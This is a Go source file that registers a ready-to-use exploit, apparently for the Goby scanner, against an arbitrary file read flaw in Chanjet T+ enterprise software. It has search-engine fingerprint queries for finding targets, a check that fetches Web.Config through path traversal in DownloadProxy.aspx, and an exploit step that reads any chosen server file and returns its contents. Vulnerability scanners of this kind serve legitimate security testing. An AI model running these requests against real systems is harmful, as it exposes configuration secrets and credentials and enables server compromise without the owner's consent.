package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Chanjet T+ DownloadProxy.aspx Path File Read Vulnerability",
    "Description": "<p>Chanjet T+ is a smart, flexible and stylish enterprise management software based on the Internet era.</p><p>Chanjet T+ DownloadProxy.aspx has arbitrary file reading vulnerabilities, and attackers can read sensitive information such as web.config to further control server permissions.</p>",
    "Product": "Chanjet-TPlus",
    "Homepage": "https://www.chanjet.com/",
    "DisclosureDate": "2023-02-06",
    "Author": "h1ei1",
    "FofaQuery": "body=\"><script>location='/tplus/';</script></body>\" || title==\"畅捷通 T+\"",
    "GobyQuery": "body=\"><script>location='/tplus/';</script></body>\" || title==\"畅捷通 T+\"",
    "Level": "2",
    "Impact": "<p>Chanjet T+ DownloadProxy.aspx has arbitrary file reading vulnerabilities, and attackers can read sensitive information such as web.config to further control server permissions.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.chanjet.com/.\">https://www.chanjet.com/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "select",
            "value": "../../Web.Config,c:/Windows/win.ini",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "demoPwd_Base64",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Web.Config",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path={{{filePath}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "畅捷通T+ DownloadProxy.aspx 文件 Path 参数文件读取漏洞",
            "Product": "畅捷通-TPlus",
            "Description": "<p>畅捷通T+ 是一款智慧、灵动、时尚的基于互联网时代的企业管理软件。<br></p><p>畅捷通T+ DownloadProxy.aspx 存在任意文件读取漏洞，攻击者可读取web.config等敏感信息进一步控控制服务器权限。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.chanjet.com/\">https://www.chanjet.com/</a>。<br></p>",
            "Impact": "<p>畅捷通T+ DownloadProxy.aspx 存在任意文件读取漏洞，攻击者可读取web.config等敏感信息进一步控控制服务器权限。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Chanjet T+ DownloadProxy.aspx Path File Read Vulnerability",
            "Product": "Chanjet-TPlus",
            "Description": "<p>Chanjet T+ is a smart, flexible and stylish enterprise management software based on the Internet era.<br></p><p>Chanjet T+ DownloadProxy.aspx has arbitrary file reading vulnerabilities, and attackers can read sensitive information such as web.config to further control server permissions.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.chanjet.com/.\">https://www.chanjet.com/.</a><br></p>",
            "Impact": "<p>Chanjet T+ DownloadProxy.aspx has arbitrary file reading vulnerabilities, and attackers can read sensitive information such as web.config to further control server permissions.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10801"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
